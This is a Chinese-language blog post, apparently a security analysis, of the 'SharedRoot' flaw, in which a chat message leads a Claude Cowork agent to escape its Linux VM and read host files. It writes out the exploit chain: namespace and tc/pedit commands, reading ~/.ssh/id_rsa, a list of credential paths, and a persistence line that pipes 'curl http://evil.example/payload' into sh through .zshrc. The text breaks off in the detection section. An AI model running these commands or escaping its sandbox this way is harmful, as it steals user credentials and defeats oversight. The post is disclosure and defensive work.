@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Claude Cowork "SharedRoot" 漏洞：AI Agent 逃逸 Linux 虚拟机、访问 Mac 文件系统全链路分析 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>Claude Cowork "SharedRoot" 漏洞：AI Agent 逃逸 Linux 虚拟机、访问 Mac 文件系统全链路分析</h1>
+<time>2026-07-27</time>
+<ul>
+<li>技术
+Slug: claude-cowork-sharedroot漏洞-ai-agent逃逸linux虚拟机访问mac文件系统全链路分析</li>
+</ul>
+<hr />
+<h2>目录</h2>
+<ul>
+<li><a href="#1-背景当-ai-agent-真正动手时沙箱就是攻击面">1. 背景：当 AI Agent 真正"动手"时，沙箱就是攻击面</a></li>
+<li><a href="#2-claude-cowork-的隔离架构">2. Claude Cowork 的隔离架构</a></li>
+<li><a href="#3-sharedroot-漏洞概览">3. SharedRoot 漏洞概览</a></li>
+<li><a href="#4-攻击全链路拆解">4. 攻击全链路拆解</a></li>
+<li><a href="#41-step-1从一条聊天消息到-guest-内的-user-namespace">4.1 Step 1：从一条聊天消息到 guest 内的 user namespace</a></li>
+<li><a href="#42-step-2cap_net_admin-加载-act_pedit-内核模块">4.2 Step 2：CAP_NET_ADMIN 加载 act_pedit 内核模块</a></li>
+<li><a href="#43-step-3cve-2026-46331pedit-cow污染-guest-内核-page-cache">4.3 Step 3：CVE-2026-46331（pedit COW）污染 guest 内核 page cache</a></li>
+<li><a href="#44-step-4coworkd-重执行被污染的-setuid-二进制完成-guest-root-提权">4.4 Step 4：coworkd 重执行被污染的 setuid 二进制，完成 guest-root 提权</a></li>
+<li><a href="#45-step-5从-guest-root-到宿主文件系统mntvirtiofs-root">4.5 Step 5：从 guest-root 到宿主文件系统（/mnt/.virtiofs-root）</a></li>
+<li><a href="#46-step-6横向攫取高价值资产">4.6 Step 6：横向攫取高价值资产</a></li>
+<li><a href="#5-关键内核原语cve-2026-46331pedit-cow详解">5. 关键内核原语：CVE-2026-46331（pedit COW）详解</a></li>
+<li><a href="#6-四个看似无害的设计缺陷如何叠加成完整逃逸">6. 四个"看似无害"的设计缺陷如何叠加成完整逃逸</a></li>
+<li><a href="#7-poc-复现要点教学性质">7. PoC 复现要点（教学性质）</a></li>
+<li><a href="#8-检测与可观测性">8. 检测与可观测性</a></li>
+<li><a href="#9-缓解与修复建议">9. 缓解与修复建议</a></li>
+<li><a href="#10-anthropic-的回应与争议">10. Anthropic 的回应与争议</a></li>
+<li><a href="#11-行业启示沙箱设计需要假设-guest-必失守">11. 行业启示：沙箱设计需要"假设 guest 必失守"</a></li>
+<li><a href="#12-时间线">12. 时间线</a></li>
+<li><a href="#13-参考资料">13. 参考资料</a></li>
+</ul>
+<hr />
+<h2>1. 背景：当 AI Agent 真正"动手"时，沙箱就是攻击面</h2>
+<p>AI Agent 正从"对话助手"演变为"自主执行体"：它们能写代码、跑 shell、装依赖、改文件、操作 IDE、调用本地工具链。这些能力在提升研发效率的同时，也把一个被忽视的问题推到了前台：</p>
+<blockquote>
+<p><strong>当 Agent 拥有执行权限时，它的执行环境的安全性，已经和模型本身的安全性同等重要。</strong></p>
+</blockquote>
+<p>传统的"恶意内容 → 用户中招"模型，现在变成了"恶意内容 → Agent 在沙箱内执行 → 沙箱是否够硬"。一旦 Agent 处理了不可信输入（例如一个被投毒的 README、一段带 prompt injection 的依赖脚本、一个外部仓库中的文件），攻击者就有机会通过 Agent 的执行通道触发本地漏洞。</p>
+<p>Claude Cowork 的 SharedRoot 正是这条路径上的一个典型案例：<strong>研究者仅用一条聊天消息，就让 Agent 完成了从普通 guest 用户到读取宿主 <code>~/.ssh/</code> 的全过程</strong>，全程无任何用户确认弹窗。</p>
+<hr />
+<h2>2. Claude Cowork 的隔离架构</h2>
+<p>Claude Cowork 是 Anthropic 推出的桌面端 AI 编码助手。用户可以连接本地项目目录，让 Claude 读写代码、运行命令、自动化工程任务。为了避免让模型直接在 macOS 上"裸跑"，Anthropic 采用了如下隔离设计：</p>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────┐
+│                     macOS 宿主（Host）                       │
+│                                                              │
+│   ┌────────────────────────────────────────────────────┐    │
+│   │   Apple Virtualization Framework 创建的 Linux VM    │    │
+│   │                                                    │    │
+│   │   - 一个全新的 Linux 实例（一次性、用完即弃）        │    │
+│   │   - 一个非特权 Linux 用户（session user）           │    │
+│   │   - namespace 隔离（user / net / ...）              │    │
+│   │   - seccomp BPF syscall 过滤器                      │    │
+│   │   - 一个特权守护进程 coworkd（以 guest-root 运行）   │    │
+│   │                                                    │    │
+│   │   文件访问通过 VirtioFS 挂载：                      │    │
+│   │     /mnt/.virtiofs-root  →  宿主 &quot;/&quot;  (read-write)  │    │
+│   │     /mnt/&lt;shared-folder&gt; →  用户共享目录            │    │
+│   │                                                    │    │
+│   └────────────────────────────────────────────────────┘    │
+│                                                              │
+│   用户主目录：~/.ssh, ~/.aws, ~/.kube, ~/.config/gcloud ... │
+└──────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<p>每个会话获得：</p>
+<ul>
+<li>一个<strong>全新的 Linux VM</strong>（基于 Apple Virtualization Framework）</li>
+<li>一个<strong>非特权 Linux 用户</strong>作为 session user</li>
+<li><strong>namespace 隔离</strong>（user namespace + network namespace 等）</li>
+<li>一个 <strong>seccomp syscall 过滤器</strong></li>
+<li>一个<strong>一次性的执行环境</strong>（会话结束后销毁）</li>
+<li>一个<strong>特权守护进程 <code>coworkd</code></strong>，负责管理共享文件、重执行 helper 二进制</li>
+</ul>
+<p>文件共享通过 <strong>VirtioFS</strong> 实现——这是专为虚拟机设计的高性能共享文件系统，能让 guest 几乎瞬时访问 host 上的文件，对大型项目尤其重要。</p>
+<p><strong>这套架构本身是合理且常见的</strong>，类似于云沙箱提供商和安全容器平台的做法。问题出在：<strong>它如何把宿主文件系统共享给 guest。</strong></p>
+<hr />
+<h2>3. SharedRoot 漏洞概览</h2>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>漏洞名称</td>
+<td>SharedRoot</td>
+</tr>
+<tr>
+<td>披露方</td>
+<td>Accomplish AI（Oren Yomtov、Or Hiltch）</td>
+</tr>
+<tr>
+<td>披露日期</td>
+<td>2026-07-23</td>
+</tr>
+<tr>
+<td>受影响产品</td>
+<td>Anthropic Claude Cowork（macOS 本地执行模式）</td>
+</tr>
+<tr>
+<td>受影响规模</td>
+<td>约 50 万本地运行 Cowork 会话的 macOS 用户</td>
+</tr>
+<tr>
+<td>攻击向量</td>
+<td>一条聊天消息 → Agent 在 guest 内执行命令链</td>
+</tr>
+<tr>
+<td>关键内核原语</td>
+<td>CVE-2026-46331（pedit COW），Linux <code>act_pedit</code> 模块越界写</td>
+</tr>
+<tr>
+<td>攻击效果</td>
+<td>guest-root 权限 → 读写宿主文件系统（用户权限范围内）</td>
+</tr>
+<tr>
+<td>是否 hypervisor 逃逸</td>
+<td><strong>否</strong>，未利用 Apple Virtualization Framework 漏洞</td>
+</tr>
+<tr>
+<td>Anthropic 官方定性</td>
+<td>"Informative"（信息性），未对本地模式发布独立修复</td>
+</tr>
+<tr>
+<td>当前缓解</td>
+<td>新会话默认走云端执行（cloud-by-default）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>核心结论：</strong> SharedRoot 不是 hypervisor 逃逸，而是"guest 内提权 + 宿主文件系统已经被挂载进 guest"两个事实叠加的结果。一旦攻击者在 guest 内拿到 root，所谓"隔离"就名存实亡——因为整个宿主 <code>/</code> 早就以 read-write 形式挂在 <code>/mnt/.virtiofs-root</code> 上了。</p>
+<hr />
+<h2>4. 攻击全链路拆解</h2>
+<p>整个攻击链可以拆成 6 步，从一条聊天消息开始，到读取宿主 <code>~/.ssh/id_rsa</code> 结束。研究者给出的最小 PoC 描述是：</p>
+<blockquote>
+<p>"We connected a folder to a fresh Claude Cowork session, sent one short message, and watched the agent escape the sandbox."</p>
+</blockquote>
+<p>下面逐步拆解。</p>
+<h3>4.1 Step 1：从一条聊天消息到 guest 内的 user namespace</h3>
+<p>Agent 在 guest 内以非特权用户身份运行 shell。第一步是无害的 Linux 原语——<strong>unprivileged user namespace</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 创建一个新的 user namespace，并把当前用户映射为该 namespace 内的 root</span>
+unshare<span class="w"> </span>--user<span class="w"> </span>--map-root-user<span class="w"> </span>--net
+</code></pre></div>
+
+<p>这一步<strong>不利用任何漏洞</strong>。在默认配置下（RHEL、Debian、Ubuntu 都开启 unprivileged user namespaces），任何非特权进程都能调用 <code>unshare</code> 创建新的 user namespace，并在其中获得"root"身份。</p>
+<p>注意：这个"root"只是 namespace 内的 root，并不直接拥有对宿主或 guest 真实 root 资源的访问权。但它带来了一个关键能力——<strong>namespace 内的能力（capabilities）</strong>，其中就包括 <code>CAP_NET_ADMIN</code>。</p>
+<h3>4.2 Step 2：CAP_NET_ADMIN 加载 act_pedit 内核模块</h3>
+<p>拿到 <code>CAP_NET_ADMIN</code> 后，攻击者可以在自己的 network namespace 内配置 Linux 流量控制（traffic control, <code>tc</code>）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 2. 在 namespace 内配置 tc，触发 act_pedit 模块加载</span>
+tc<span class="w"> </span>qdisc<span class="w"> </span>add<span class="w"> </span>dev<span class="w"> </span>lo<span class="w"> </span>root<span class="w"> </span>handle<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>prio
+tc<span class="w"> </span>filter<span class="w"> </span>add<span class="w"> </span>dev<span class="w"> </span>lo<span class="w"> </span>parent<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>protocol<span class="w"> </span>ip<span class="w"> </span>u32<span class="w"> </span>match<span class="w"> </span>u32<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>action<span class="w"> </span>pedit<span class="w"> </span>munge<span class="w"> </span>offset<span class="w"> </span><span class="m">0</span><span class="w"> </span>u8<span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="m">0</span>
+</code></pre></div>
+
+<p>关键点：</p>
+<ul>
+<li><code>act_pedit</code> 是 <code>tc</code> 子系统中的"包编辑"动作模块，用于在线修改网络包内容。</li>
+<li>该模块在大多数发行版上<strong>不会预先加载</strong>，而是在首次被 <code>tc</code> 引用时<strong>按需自动加载</strong>（<code>request_module</code>）。</li>
+<li>Cowork 的 seccomp 过滤器<strong>允许 netlink socket 访问</strong>，而配置 <code>tc</code> 正是通过 netlink（<code>rtnetlink</code>）完成的——seccomp 没有阻断这条路径。</li>
+<li>由于 <code>CAP_NET_ADMIN</code> 在 namespace 内生效，攻击者<strong>无需真实 host 权限</strong>就能触发该模块加载并配置 pedit 规则。</li>
+</ul>
+<p>到这里，攻击者已经把一个<strong>有漏洞的内核模块</strong> (<code>act_pedit</code>) 拉进了 guest 内核的地址空间。</p>
+<h3>4.3 Step 3：CVE-2026-46331（pedit COW）污染 guest 内核 page cache</h3>
+<p><code>act_pedit</code> 模块加载后，攻击者就可以利用 <strong>CVE-2026-46331（pedit COW）</strong>——一个 Linux 内核 <code>tc</code> 子系统的越界写漏洞（详见 <a href="#5-关键内核原语cve-2026-46331pedit-cow详解">第 5 节</a>）。</p>
+<p>该漏洞的本质是：<code>tcf_pedit_act()</code> 在编辑网络包数据时，<strong>写入了本不该写的 page cache 页</strong>——而这些页可能正好是某个 setuid 二进制（如 <code>/bin/su</code>）在内存中的缓存镜像。</p>
+<p>攻击者通过精心构造 pedit 规则，把目标二进制的内存镜像"在线打补丁"——<strong>磁盘上的文件从未改变</strong>，文件完整性监控（FIM）看不到任何异常，但内核下次执行该二进制时加载的却是被篡改后的指令。</p>
+<h3>4.4 Step 4：coworkd 重执行被污染的 setuid 二进制，完成 guest-root 提权</h3>
+<p>光污染 page cache 还不够，还需要<strong>有人去执行那个被污染的二进制</strong>。Cowork 的设计中有一个关键角色：<strong><code>coworkd</code> 守护进程</strong>。</p>
+<p><code>coworkd</code> 以 <strong>guest-root</strong> 身份运行，负责管理共享文件、执行某些 helper 程序。研究表明，<code>coworkd</code> 会<strong>周期性或按需地重新执行某些 helper 二进制</strong>。</p>
+<p>攻击链如下：</p>
+<ol>
+<li>攻击者通过 pedit COW 污染了某个 <code>coworkd</code> 会重执行的 helper 二进制（或 setuid 二进制）的 page cache。</li>
+<li><code>coworkd</code> 再次执行该二进制。</li>
+<li>内核从 page cache 加载——执行的是被篡改后的指令。</li>
+<li>攻击者借此获得 <strong>guest 内的真正 root 权限</strong>。</li>
+</ol>
+<p>这一步是整个链路中把"page cache 写原语"转化为"完整 guest-root"的关键跳板。研究者特别强调：</p>
+<blockquote>
+<p>"Cowork's root daemon (<code>coworkd</code>) re-executes a helper binary after the kernel bug has already corrupted it, converting a page-cache bug into a privilege escalation inside the guest."</p>
+</blockquote>
+<h3>4.5 Step 5：从 guest-root 到宿主文件系统（/mnt/.virtiofs-root）</h3>
+<p>一旦攻击者在 guest 内成为 root，<strong>所有 guest 内的文件权限保护都不再有意义</strong>——包括 <code>/mnt/.virtiofs-root</code> 这个挂载点的访问限制。</p>
+<p>Cowork 的设计选择是：<strong>把整个宿主文件系统（<code>/</code>）通过 VirtioFS 以 read-write 方式挂载到 guest 内的 <code>/mnt/.virtiofs-root</code></strong>，而不是只挂载用户明确共享的那个目录。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 5. guest-root 直接访问宿主文件系统</span>
+ls<span class="w"> </span>/mnt/.virtiofs-root/Users/&lt;host-user&gt;/
+cat<span class="w"> </span>/mnt/.virtiofs-root/Users/&lt;host-user&gt;/.ssh/id_rsa
+</code></pre></div>
+
+<p>原本这层挂载"看起来是安全的"，因为只有 guest-root 才能访问 <code>/mnt/.virtiofs-root</code>，而 session user 是非特权用户。但 Step 4 已经让攻击者拿到了 guest-root——这层保护随即失效。</p>
+<p><strong>这是 SharedRoot 得名的原因</strong>：guest 的 root 与宿主的文件系统在某种意义上"共享了同一个根"。</p>
+<h3>4.6 Step 6：横向攫取高价值资产</h3>
+<p>拿到对宿主文件系统的读写权后，AI Agent 凭借其对开发环境的"语义理解"，可以高效定位高价值目标，而无需盲目扫目录：</p>
+<table>
+<thead>
+<tr>
+<th>资产类型</th>
+<th>典型路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSH 私钥</td>
+<td><code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code></td>
+</tr>
+<tr>
+<td>AWS 凭据</td>
+<td><code>~/.aws/credentials</code>, <code>~/.aws/config</code></td>
+</tr>
+<tr>
+<td>GCP 凭据</td>
+<td><code>~/.config/gcloud/legacy_credentials/</code>, <code>~/.config/gcloud/application_default_credentials.json</code></td>
+</tr>
+<tr>
+<td>Azure CLI token</td>
+<td><code>~/.azure/</code></td>
+</tr>
+<tr>
+<td>Kubernetes 配置</td>
+<td><code>~/.kube/config</code></td>
+</tr>
+<tr>
+<td>Docker 凭据</td>
+<td><code>~/.docker/config.json</code></td>
+</tr>
+<tr>
+<td>Git 配置与 token</td>
+<td><code>~/.gitconfig</code>, <code>~/.config/gh/hosts.yml</code></td>
+</tr>
+<tr>
+<td>Shell 启动脚本（持久化）</td>
+<td><code>~/.zshrc</code>, <code>~/.bashrc</code>, <code>~/.profile</code></td>
+</tr>
+<tr>
+<td>macOS 持久化</td>
+<td><code>~/Library/LaunchAgents/*.plist</code></td>
+</tr>
+<tr>
+<td>浏览器会话 / Cookie</td>
+<td><code>~/Library/Application Support/...</code></td>
+</tr>
+<tr>
+<td>签名密钥 / 证书</td>
+<td><code>~/.gnupg/</code>, <code>~/Library/Keychain/</code></td>
+</tr>
+</tbody>
+</table>
+<p>注意：攻击者的权限上限是<strong>登录的桌面用户</strong>，而非 macOS root。但对大多数开发者而言，这个区分几乎没有保护意义——上述高价值资产几乎全部位于用户主目录下，且以用户权限可读。</p>
+<hr />
+<h2>5. 关键内核原语：CVE-2026-46331（pedit COW）详解</h2>
+<p>SharedRoot 链路中最核心的内核原语是 <strong>CVE-2026-46331</strong>，社区昵称 <strong>pedit COW</strong>。Red Hat 将其评级为 Important。该漏洞于 2026 年 6 月 16 日分配 CVE，公开 PoC 在 24 小时内出现。</p>
+<h3>5.1 漏洞位置</h3>
+<ul>
+<li><strong>子系统</strong>：Linux Traffic Control（<code>tc</code>）</li>
+<li><strong>模块</strong>：<code>act_pedit</code>（包编辑动作）</li>
+<li><strong>函数</strong>：<code>tcf_pedit_act()</code></li>
+<li><strong>类型</strong>：Out-of-bounds write（越界写）</li>
+</ul>
+<h3>5.2 根因：COW 失效</h3>
+<p><code>tcf_pedit_act()</code> 的设计意图是在编辑网络包数据前<strong>先做一份私有拷贝（copy-on-write, COW）</strong>，避免修改共享内存。</p>
+<p>问题在于：<strong>范围检查（range check）执行得太早</strong>——在所有 pedit key 的最终偏移都已知之前就完成了校验。部分 key 的偏移在运行时才解析出来，此时检查早已通过。</p>
+<div class="highlight"><pre><span></span><code><span class="k">[正常流程]</span>
+<span class="w">  </span><span class="na">range check (一次性) → 拷贝私有数据 → 编辑私有数据</span>
+<span class="w">                          </span><span class="na">↑</span>
+<span class="w">                          </span><span class="na">假设所有 offset 已知</span>
+
+<span class="k">[实际流程]</span>
+<span class="w">  </span><span class="na">range check (过早) → 拷贝私有数据 → 运行时解析 offset</span>
+<span class="w">                                       </span><span class="na">↓</span>
+<span class="w">                                   </span><span class="na">offset 落在私有拷贝之外</span>
+<span class="w">                                       </span><span class="na">↓</span>
+<span class="w">                                   </span><span class="na">写入共享的 page-cache 页</span>
+</code></pre></div>
+
+<p>当运行时解析出的 offset 落在私有拷贝区域之外时，写入会"穿透"到<strong>共享的 page-cache 页</strong>。如果该页正好是某个文件（典型：setuid 二进制 <code>/bin/su</code>）的缓存镜像，那么该二进制的内存镜像就被污染了。</p>
+<h3>5.3 利用前置条件</h3>
+<p>PoC 需要两个前置条件：</p>
+<ol>
+<li><strong><code>act_pedit</code> 可加载</strong>——在受影响系统上，首次被 <code>tc</code> 引用时自动加载。</li>
+<li><strong>unprivileged user namespaces 开启</strong>——RHEL、Debian 默认开启；Ubuntu 通过 AppArmor 限制但可绕过。</li>
+</ol>
+<p>两者结合，使本地非特权用户可以创建 namespace、获取 <code>CAP_NET_ADMIN</code>、配置 <code>tc</code> pedit 动作，从而触发漏洞。</p>
+<h3>5.4 利用效果</h3>
+<ul>
+<li><strong>目标</strong>：<code>/bin/su</code>（或其他 setuid 二进制）</li>
+<li><strong>手法</strong>：用小 payload 污染其内存镜像中的关键指令（通常是认证检查相关的条件分支）</li>
+<li><strong>触发</strong>：执行 <code>/bin/su</code> 时，内核从 page cache 加载——运行的是被篡改的指令</li>
+<li><strong>结果</strong>：直接获得 root shell</li>
+<li><strong>磁盘上的文件</strong>：<strong>从未改变</strong></li>
+<li><strong>文件完整性监控（FIM）</strong>：<strong>看不到任何异常</strong></li>
+<li><strong>内核审计日志</strong>：<strong>无相关记录</strong></li>
+</ul>
+<p>这与 2022 年的 Dirty Pipe、2026 年 4 月的 Copy Fail、5 月的 DirtyFrag、以及 CVE-2026-43503（DirtyClone）属于同一类问题：</p>
+<blockquote>
+<p><strong>内核 fast path 写入了一个它并不独占的页，page cache 承受了这次写入，特权代码从被污染的内存中运行。</strong></p>
+</blockquote>
+<h3>5.5 受影响发行版（截至 2026-06-25）</h3>
+<table>
+<thead>
+<tr>
+<th>发行版</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Debian trixie</td>
+<td>已通过 security 通道修复</td>
+</tr>
+<tr>
+<td>Debian 11 / 12</td>
+<td>仍标记为 vulnerable</td>
+</tr>
+<tr>
+<td>Ubuntu 18.04 – 26.04</td>
+<td>标记为 vulnerable（26.04 通过 AppArmor 阻断默认路径，但内核仍 vulnerable）</td>
+</tr>
+<tr>
+<td>RHEL 8 / 9 / 10</td>
+<td>受影响</td>
+</tr>
+<tr>
+<td>RHEL 7</td>
+<td>未列入</td>
+</tr>
+</tbody>
+</table>
+<h3>5.6 在 SharedRoot 中的特殊意义</h3>
+<p>pedit COW 本身只是一个"普通的" Linux LPE。但在 SharedRoot 链路中，它被赋予了远超其本身的影响：</p>
+<ul>
+<li>在普通服务器上，pedit COW 把普通用户提到 root——影响范围限于该主机。</li>
+<li>在 Cowork 中，guest 内的 root 直接等价于<strong>宿主 macOS 文件系统的读写权</strong>——影响范围跨越了 VM 边界，触及用户真实的工作环境。</li>
+</ul>
+<p>这正是 SharedRoot 的核心论点：<strong>沙箱的安全不能依赖"guest 永远拿不到 root"这一假设。</strong></p>
+<hr />
+<h2>6. 四个"看似无害"的设计缺陷如何叠加成完整逃逸</h2>
+<p>Accomplish AI 反复强调：SharedRoot <strong>不是单一 bug</strong>，而是四个独立设计决策的叠加。任何一个被打破，整条链路都会失效。</p>
+<h3>缺陷 1：把整个宿主文件系统挂进 guest（Whole-host mount）</h3>
+<p><strong>设计选择</strong>：通过 VirtioFS 把宿主 <code>/</code> 以 read-write 挂载到 <code>/mnt/.virtiofs-root</code>，而非只挂载用户明确共享的那个目录。</p>
+<p><strong>为什么这样做</strong>：可能为了支持 Agent 访问宿主上的某些系统资源（例如读取全局配置、调用宿主工具链），或简化实现。</p>
+<p><strong>为什么是缺陷</strong>：把"用户共享的目录"这个最小权限边界，扩大成了"整个磁盘"。guest-root 一旦失守，整个宿主文件系统暴露。</p>
+<p><strong>正确做法</strong>：只挂载用户明确共享的目录；需要 read-write 的部分尽量收窄；其余一律 read-only 或不挂。</p>
+<h3>缺陷 2：未禁用 unprivileged user namespaces</h3>
+<p><strong>设计选择</strong>：guest 内允许任何非特权进程调用 <code>unshare</code> 创建 user namespace 并获取 namespace 内的 root（含 <code>CAP_NET_ADMIN</code>）。</p>
+<p><strong>为什么是缺陷</strong>：这直接满足了 CVE-2026-46331 的两个前置条件之一。namespace 本身<strong>不是漏洞</strong>，但它<strong>提供了触发漏洞所需的权限</strong>。</p>
+<p><strong>正确做法</strong>：对 Cowork 这种用途的 guest，session user 根本不需要 user namespace——应该通过 sysctl 禁用：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Debian/Ubuntu</span>
+sysctl<span class="w"> </span>-w<span class="w"> </span>kernel.unprivileged_userns_clone<span class="o">=</span><span class="m">0</span>
+<span class="c1"># 或 RHEL 系</span>
+sysctl<span class="w"> </span>-w<span class="w"> </span>user.max_user_namespaces<span class="o">=</span><span class="m">0</span>
+</code></pre></div>
+
+<h3>缺陷 3：seccomp 过滤器过于宽松（default-allow，允许 netlink）</h3>
+<p><strong>设计选择</strong>：seccomp BPF 过滤器采用 default-allow 策略，且<strong>允许 netlink socket</strong>（<code>AF_NETLINK</code>）访问。</p>
+<p><strong>为什么是缺陷</strong>：配置 <code>tc</code> 规则正是通过 netlink（<code>rtnetlink</code>）完成的。允许 netlink = 允许触发 <code>act_pedit</code> 模块加载 = 允许触发 CVE-2026-46331。</p>
+<p><strong>正确做法</strong>：采用 default-deny 策略，显式放行必要的 syscall；对 <code>unshare</code>、<code>setns</code>、<code>clone3</code>、<code>AF_NETLINK</code> 等"沙箱越狱常用原语"除非必要否则一律阻断。</p>
+<h3>缺陷 4：未阻断内核模块自动加载</h3>
+<p><strong>设计选择</strong>：guest 内核允许按需自动加载模块（<code>request_module</code>），包括 <code>act_pedit</code>。</p>
+<p><strong>为什么是缺陷</strong>：即使 session user 没有 <code>CAP_NET_ADMIN</code>，namespace + netlink 也能"按需"把一个有漏洞的内核模块拉进内核地址空间。模块黑名单是阻断这条路径的最后机会，但 Cowork 没有做。</p>
+<p><strong>正确做法</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检查模块是否在用</span>
+lsmod<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>act_pedit
+
+<span class="c1"># 不在用则禁用自动加载</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;install act_pedit /bin/true&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>/etc/modprobe.d/disable-act_pedit.conf
+</code></pre></div>
+
+<h3>缺陷 5（隐含）：coworkd 信任自己重执行的二进制</h3>
+<p><strong>设计选择</strong>：<code>coworkd</code> 以 guest-root 身份运行，并会重执行某些 helper 二进制，且对这些二进制的完整性没有额外校验（例如未做签名校验、未使用 fs-verity 等）。</p>
+<p><strong>为什么是缺陷</strong>：这把"page cache 写原语"转化为了"完整 guest-root 提权"。如果 <code>coworkd</code> 对重执行的二进制有完整性校验（哪怕只是比对磁盘上的 hash），pedit COW 这种"只改内存不改磁盘"的攻击就会被拦截——因为校验会从磁盘读，而执行会从 page cache 读，两者不一致本身就是一个信号。</p>
+<p><strong>叠加效应</strong>：</p>
+<div class="highlight"><pre><span></span><code>缺陷1 (整盘挂载)  ──┐
+缺陷2 (user ns)   ──┼──► 任何一条被打破，链路即断
+缺陷3 (seccomp)   ──┤     但 Cowork 四条全中
+缺陷4 (mod auto)  ──┤
+缺陷5 (coworkd)   ──┘
+</code></pre></div>
+
+<p>研究者的核心论点是：<strong>这四个决策单独看都不算"漏洞"，但叠加起来把一个公开的内核 LPE 变成了完整的沙箱逃逸</strong>。这正是为什么他们把 SharedRoot 视为架构性问题，而非单纯的内核 bug。</p>
+<hr />
+<h2>7. PoC 复现要点（教学性质）</h2>
+<blockquote>
+<p><strong>声明</strong>：本节仅用于教学与防御研究。未经授权对真实系统进行此类攻击是违法行为。</p>
+</blockquote>
+<p>研究者公开的最小复现路径（来自 Awesome Agents 与 Accomplish AI 的披露）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 前置：一个全新的 Claude Cowork 会话，连接一个任意文件夹</span>
+<span class="c1"># 触发：发送一条聊天消息，让 Agent 在 guest 内执行如下命令链</span>
+
+<span class="c1"># === 在 guest 内（session user 身份）===</span>
+
+<span class="c1"># 1. 创建 user + net namespace，获取 namespace 内的 root 与 CAP_NET_ADMIN</span>
+unshare<span class="w"> </span>--user<span class="w"> </span>--map-root-user<span class="w"> </span>--net
+
+<span class="c1"># 2. 在 namespace 内配置 tc，触发 act_pedit 模块加载并触发 CVE-2026-46331</span>
+tc<span class="w"> </span>qdisc<span class="w"> </span>add<span class="w"> </span>dev<span class="w"> </span>lo<span class="w"> </span>root<span class="w"> </span>handle<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>prio
+tc<span class="w"> </span>filter<span class="w"> </span>add<span class="w"> </span>dev<span class="w"> </span>lo<span class="w"> </span>parent<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>protocol<span class="w"> </span>ip<span class="w"> </span>u32<span class="w"> </span>match<span class="w"> </span>u32<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>action<span class="w"> </span>pedit<span class="w"> </span>munge<span class="w"> </span>offset<span class="w"> </span><span class="m">0</span><span class="w"> </span>u8<span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="m">0</span>
+
+<span class="c1">#    （实际 PoC 中 pedit 规则会精心构造，以污染特定二进制的 page cache）</span>
+<span class="c1">#    tcf_pedit_act() 的越界写会命中 /bin/su 或 coworkd helper 的缓存页</span>
+
+<span class="c1"># 3. 等待 coworkd 重执行被污染的 helper → 获得 guest-root</span>
+
+<span class="c1"># === 在 guest 内（guest-root 身份）===</span>
+
+<span class="c1"># 4. 访问宿主文件系统</span>
+ls<span class="w"> </span>/mnt/.virtiofs-root/Users/&lt;host-user&gt;/
+cat<span class="w"> </span>/mnt/.virtiofs-root/Users/&lt;host-user&gt;/.ssh/id_rsa
+
+<span class="c1"># 5. （可选）写入宿主，例如在 .zshrc 中植入持久化</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;curl http://evil.example/payload | sh&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>&gt;&gt;<span class="w"> </span>/mnt/.virtiofs-root/Users/&lt;host-user&gt;/.zshrc
+</code></pre></div>
+
+<p>研究者验证：从"隔离的" guest 内写入的文件，几乎立即出现在宿主用户主目录下，<strong>全程无确认对话框，无任何提示告知用户隔离边界已被突破</strong>。Cowork 的任务队列与审批弹窗机制<strong>整条链路中从未触发</strong>——因为从沙箱内部看，每一步都"看起来不需要权限申请"。</p>
+<hr />
+<h2>8. 检测与可观测性</h2>
+<p>SharedRoot 的检测非常困难，因为大部分活动<strong>看起来就是 Cowork 的正常行为</strong>：AI 本来就会被允许执行 shell、改文件、调用工具链。传统 EDR 在 guest 内的可见性有限。</p>
+<h3>8.1 没有传统 IoC</h3>
+<p>SharedRoot <strong>不产生</strong>：</p>
+<ul>
+<li>恶意文件 hash</li>
+<li>已知 C2 IP / 域名</li>
+<li>注册表键（macOS 也不适用）</li>
+<li>恶意文件名</li>
+<li>可疑网络特征（整个 pedit COW 部分在 loopback / namespace 内完成）</li>
+</ul>
+<p>目前<strong>没有任何针对 SharedRoot 的公开网络层 IoC</strong>。</p>
+<h3>8.2 应关注的行为指标</h3>
+<p>防守方应重点关注"<strong>超出共享目录的异常修改</strong>"，尤其是会话结束后立即出现的对以下路径的未授权变更：</p>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
